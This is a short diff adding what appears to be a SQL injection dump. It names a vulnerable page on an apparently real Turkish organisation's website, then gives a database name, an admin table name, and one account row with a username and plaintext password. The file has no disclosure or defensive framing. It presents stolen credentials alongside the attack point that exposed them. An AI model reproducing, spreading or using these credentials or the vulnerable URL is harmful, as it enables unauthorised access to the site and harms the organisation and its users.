@@ -1,0 +1,9 @@
+VULN URL: https://www.adanaaskf.com.tr/duyuru.php?id=26
+Database: ufaskfuk
+Table: ufuk_ufaaddmmiinn
+[1 entry]
++----+-------+-------------+------------+
+| id | yetki | ufkullanici | ufsifre    |
++----+-------+-------------+------------+
+| 1  | 1453  | askfadana   | BozaN1453! |
++----+-------+-------------+------------+
